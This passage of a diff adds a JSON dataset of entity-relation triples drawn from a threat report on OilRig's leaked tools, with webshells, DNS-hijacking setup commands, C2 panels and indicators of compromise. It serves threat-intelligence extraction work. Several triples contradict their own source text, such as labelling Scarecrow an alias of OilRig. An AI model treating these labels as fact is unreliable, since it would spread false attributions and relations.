+      "context": "[IP address]\\c$\\Users\\[username]\\Desktop [IP address]\\c$\\Users\\[username]\\Documents [IP address]\\c$\\Users\\[username]\\Downloads The Network Downloader function will gather all the fi les in these folders and use 7-Zip to compress and archive the fi les.",
+      "triple": [
+        {
+          "subject": {
+            "name": "The Network Downloader function",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "7-Zip",
+            "type": "Software"
+          },
+          "evidence": {
+            "quote": "use 7-Zip to compress and archive the files"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The webshell will save the archives locally to the server in the C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a fi lename with the following structure:",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "C:\\Users\\Public\\Libraries\\Recorded\\Files",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "the webshell will save the archives locally to the server in the C:\\\\\\\\\\\\Users\\\\\\\\\\\\Public\\\\\\Libraries\\\\\\\\Recorded\\\\\\\\Files folder"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes][seconds].7z It is likely that the threat actors use this functionality to rapidly check for new fi les created by users on the network.",
+      "triple": [
+        {
+          "subject": {
+            "name": "[IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes][seconds].7z",
+            "type": "Filename"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "[IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes][seconds].7z",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "[IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes][seconds].7z"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Minion Minion appears to be another webshell related to HighShell, as it contains similar functionality and signi fi cant code overlap.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Minion",
+            "type": "Application"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "webshell",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "appears to be another webshell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This is the exact same process used to authenticate/decrypt within HyperShell.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HyperShell",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "authenticate/decrypt",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "used to authenticate/decrypt within HyperShell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Much like HighShell version 8.6.2, Minion includes modules to extend the webshell's functionality.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Minion",
+            "type": "Webshell"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "modules",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "includes modules to extend the webshell's functionality"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In November 2018, Cisco Talos published research on an attack campaign named DNSpionage.",
+      "triple": [
+        {
+          "subject": {
+            "name": "DNSpionage",
+            "type": "Campaign"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "an attack campaign",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "named DNSpionage"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "019",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "It involved attacks using malware to compromise individual endpoints, but most interestingly described an e ff ort to speci fi cally hijack DNS entries of government organizations to redirect visitors to likely malicious, adversary operated systems.",
+      "triple": [
+        {
+          "subject": {
+            "name": "attacks",
+            "type": "AttackPattern"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "malware",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "using malware to compromise individual endpoints"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "020",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "No attribution to any known adversary groups was provided, other than that the target radius was primarily in the Middle East and the adversary was also likely operating out of that region.",
+      "triple": [
+        {
+          "subject": {
+            "name": "adversary",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Middle East",
+            "type": "Region"
+          },
+          "evidence": {
+            "quote": "target radius was primarily in the Middle East"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "022",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "An informational document is included titled guide.txt , as seen in Figure 16 that provides instructions to the operator on how to execute the DNS hijacking attack using the provided tools.",
+      "triple": [
+        {
+          "subject": {
+            "name": "guide.txt",
+            "type": "Filename"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "informational document",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "An informational document is included titled guide.txt"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "024",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Based upon the instructional guide and the provided tools, this package appears consistent with the methodologies FireEye outlined in their",
+      "triple": [
+        {
+          "subject": {
+            "name": "package",
+            "type": "Unknown"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "methodologies",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "this package appears consistent with the methodologies"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "025",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " research on how these attacks were executed, including speci fi c details such as the use of ICAP via a proxy passthrough, in this case speci fi cally squid, and using certbot to create a Let's Encrypt SSL certi fi cate.",
+      "triple": [
+        {
+          "subject": {
+            "name": "ICAP",
+            "type": "Protocol"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "proxy passthrough",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "use of ICAP via a proxy passthrough"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Instructions within guide.txt explaining how to carry out DNS hijacking attack 34 forever-service install dns-server script dnsd.js start 35 36 inja 37 <copy icap server script> 38 ipcocd icap 39 screen 40 python icap.pY 41 cexit screen (Ctrl+A CtrlD) > 43 cd /opt apt-get install openssl devscripts build-essential libssl-dev apache2 squid-langpack apt source squid3 apt-get build-dep squid3 cd squid3-3.4.8 vim debian/rules <insert below lines in DEB_CONFIGURE_ 50 enable-ssl 51 enable-ssl-crtd 52 with-open-ssl \"/etc/sslopenssl.cnf\" 53 debuild ~uc 54 cd 55 dpkg ~1 + deb 56 apt-get install 57 service apache2 stop 58 service squid3 stop 59 cd /etc/squid3/ 60 squid.conf squid.conf.bckp 61 vim squid.conf 62 <insert below lines> 63 visible_hostname edge.",
+      "triple": [
+        {
+          "subject": {
+            "name": "guide.txt",
+            "type": "Filepath"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "DNS hijacking attack",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "Instructions within guide.txt explaining how to carry out DNS hijacking attack"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP ( 185.162.235[.]106 ) for the legitimate domain to be redirected to.",
+      "triple": [
+        {
+          "subject": {
+            "name": "guide.txt",
+            "type": "Filepath"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "target",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "In one part of guide.txt, an example target appears to be provided"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Analysis of this IP provides several interesting data points, including possible relationships to previously observed OilRig infrastructure.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Analysis",
+            "type": "MalwareAnalysis"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "OilRig infrastructure",
+            "type": "Infrastructure"
+          },
+          "evidence": {
+            "quote": "possible relationships to previously observed OilRig infrastructure"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Serverius Holding B.V.",
+            "type": "Organization"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "autonomous system name of the IP",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In fact, examining the Class C IP block of 185.162.235[.]0/24 shows at least two other IPs we have previously identi fi ed as in use by the OilRig group for C2 servers.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Class C IP block of 185.162.235[.]0/24",
+            "type": "IPAddress"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "C2 servers",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "shows at least two other IPs we have previously identi fi ed as in use by the OilRig group for C2 servers"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Later in February 2018 we were able to link the entire grouping of infrastructure to another campaign delivering the OopsIE backdoor via the reuse of WHOIS registrant artifacts, shared SSL certi fi cates, and a shared Class C IP block.",
+      "triple": [
+        {
+          "subject": {
+            "name": "grouping of infrastructure",
+            "type": "Infrastructure"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "another campaign",
+            "type": "Campaign"
+          },
+          "evidence": {
+            "quote": "we were able to link the entire grouping of infrastructure to another campaign"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "011",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Figure 17 shows the relationship between the fi les related to DNS hijacking and known infrastructure associated with OilRig.",
+      "triple": [
+        {
+          "subject": {
+            "name": "fi les",
+            "type": "Filepath"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "DNS hijacking",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "Figure 17 shows the relationship between the fi les related to DNS hijacking"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 17,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Relationship between DNS Hijacking fi les and OilRig infrastructure RELATIONAL DIAGRAM 185.162235.106 185.162235.121 msoffice-cdn com ISMInjector Campaign webmask OiLRAG 185.162.235.29 msoffice365cdn com 185.162235.0/24 OopslE Campaign office365-management com emilia jonesamailru",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "OiLRAG",
+            "type": "Campaign"
+          },
+          "evidence": {
+            "quote": "OilRig OiLRAG"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 18,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The screenshots included remote desktop (RDP) sessions showing the Glimpse panel, a web browser session displaying a C2 panel called Scarecrow , web browser sessions into VPS administrative panels, and evidence of potential destructive attacks against OilRig servers.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse panel",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "remote desktop (RDP)",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "showing the Glimpse panel, a web browser session displaying a C2 panel called Scarecrow , web browser sessions into VPS administrative panels, and evidence of potential destructive attacks against OilRig servers."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 18,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The screenshot in Figure 18. appears to be a C2 panel for an unknown backdoor.",
+      "triple": [
+        {
+          "subject": {
+            "name": "screenshot",
+            "type": "Unknown"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "backdoor",
+            "type": "Backdoor"
+          },
+          "evidence": {
+            "quote": "appears to be a C2 panel for an unknown backdoor"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 18,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The only name provided is Scarecrow , which is not a name we have previously observed or associated with OilRig.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Scarecrow",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "which is not a name we have previously observed or associated with OilRig"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 18,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "If we are to assume the fi lename is consistent with a real time snapshot of the server panel, it would indicate that multiple systems were actively compromised as of March 29, 2019.",
+      "triple": [
+        {
+          "subject": {
+            "name": "filename",
+            "type": "Filename"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "multiple systems",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "it would indicate that multiple systems were actively compromised"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 18,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Screenshot provided in leak showing Scarecrow panel Scorch Scarecrow Auto rlresh: Disabled Agents All agcnts connccicd 10 Scarcciowl Active CManage Agent Search: Versions Display Name Country Computer Name Domain User LastSeen Status ebanon about 1 minutes ago ebanon about 2 minutes ago Fonce about 2 mnules ago about 3 minutes ago cbanon about 3 minutes ago cbanon about 8 minutes ago cbanon about 9 mnules ago ebanon about 10 mnutes ago Figure 19 shows an administrative panel to an Iranian based virtual hosting provider called Berbid Server.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Scarecrow panel",
+            "type": "System"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Scorch Scarecrow Auto rlresh",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "Screenshot provided in leak showing Scarecrow panel Scorch Scarecrow Auto rlresh:"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 19,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Screenshot provided in leak showing administrative panel for hosting provider Berbid Server Cent Area 'Hello mojtabi Open Ticker Ailling Domains Services Home",
+      "triple": [
+        {
+          "subject": {
+            "name": "Berbid",
+            "type": "Organization"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Server Cent Area",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "'Hello mojtabi Open Ticker Ailling Domains Services Home'"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 19,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "One of these virtual servers was hosted at an IP address of 193.111.152[.]13 and had been up for 194 days (in the red box in Figure 20) at the time this control panel was apparently accessed.",
+      "triple": [
+        {
+          "subject": {
+            "name": "one of these virtual servers",
+            "type": "System"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "an IP address of 193.111.152[.]13",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "had been up for 194 days (in the red box in Figure 20) at the time this control panel was apparently accessed."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 19,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a fi le named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336 ), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "organization",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "On September 24, 2018, we observed an organization targeted by OilRig"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 20,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This suggests that the server displayed in the VPS control panel may have indeed been in use by the OilRig threat actors at the time of attack.",
+      "triple": [
+        {
+          "subject": {
+            "name": "server",
+            "type": "Hardware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "VPS control panel",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "displayed in the VPS control panel"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 20,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This is a tenuous relationship at best and does not indicate that the OilRig group is the one executing the DNSpionage campaign, but with the combination of the use of DeltaHost and IPs belonging to a fairly small range, there may be reason to believe that these are related to some extent.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "DNSpionage campaign",
+            "type": "Campaign"
+          },
+          "evidence": {
+            "quote": "This is a tenuous relationship at best and does not indicate that the OilRig group is the one executing the DNSpionage campaign"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 20,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Figure 21 is a screenshot of a C2 server panel for Glimpse, which we track using the name BONDUPDATER.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "BONDUPDATER",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "which we track using the name BONDUPDATER"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 20,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "If we again assume the accuracy of the time indicated in the fi lename, this would indicate that no compromised system had checked in since as far out as 71 days.",
+      "triple": [
+        {
+          "subject": {
+            "name": "this",
+            "type": "Unknown"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "no compromised system had checked in",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "this would indicate that no compromised system had checked in"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 20,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Screenshot in leak of RDP session with a server running the Glimpse C2 nn Yourcommert Delete proccaaing Oelere Delete Oclete Cood Good Cood Conclusion",
+      "triple": [
+        {
+          "subject": {
+            "name": "Glimpse",
+            "type": "CommandAndControl"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "RDP session",
+            "type": "Infrastructure"
+          },
+          "evidence": {
+            "quote": "Screenshot in leak of RDP session with a server running the Glimpse C2"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 21,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "It is important to understand that although we are able to validate the backdoors and webshells provided in the dataset as consistent with previously researched OilRig toolsets, in general we are unable to validate the origins of the entirety of the dataset and cannot con fi rm nor deny that the data has not been manipulated in some manner.",
+      "triple": [
+        {
+          "subject": {
+            "name": "dataset",
+            "type": "Unknown"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "OilRig toolsets",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "consistent with previously researched OilRig toolsets"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 21,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Looking at the data dump as a whole though, the targeting and TTPs are consistent with behaviors we have generally associated with OilRig in the past.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "TTPs",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "behaviors we have generally associated with OilRig in the past"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 21,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The disparity in regions and industries for organizations potentially a ff ected or compromised by OilRig is an excellent example of why organizations regardless of region or industry should always maintain situational awareness of adversaries, their activities, and be prepared to defend against any attack.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "organizations",
+            "type": "Organization"
+          },
+          "evidence": {
+            "quote": "potentially aff ected or compromised by OilRig"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 21,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Indicators of Compromise Domains Myleftheart[.]com office365-management[.]com msoffice-cdn[.]com Poison Frog PS1 fi les 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98dd999 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea330436c 185.36.191[.]31 185.161.209[.]57 185.161.210[.]25 164.132.67[.]216 212.32.226[.]245 IPs",
+      "triple": [
+        {
+          "subject": {
+            "name": "Poison Frog",
+            "type": "MalwareFamily"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "PS1 files",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "Poison Frog PS1 fi les"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 21,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " OopsIE payload Back to top TAGS BONDUPDATER Evasive Serpens OilRig OopsIE TwoFace 142.234.157[.]21 193.111.152[.]13 185.162.235[.]106 185.162.235[.]29 185.162.235[.]121 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336 Threat Research Center",
+      "triple": [
+        {
+          "subject": {
+            "name": "OopsIE",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "payload",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "OopsIE payload"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 22,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Next: BabyShark Malware Part Two - Attacks Continue Using KimJongRAT and PCRat Related Resources T H R E AT   A C T O R   G R O U P S",
+      "triple": [
+        {
+          "subject": {
+            "name": "BabyShark Malware",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "Part Two",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "BabyShark Malware Part Two"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 22,
+        "id": "001",
+        "source": "TEXT"
+      }
+    }
+  ]
+}
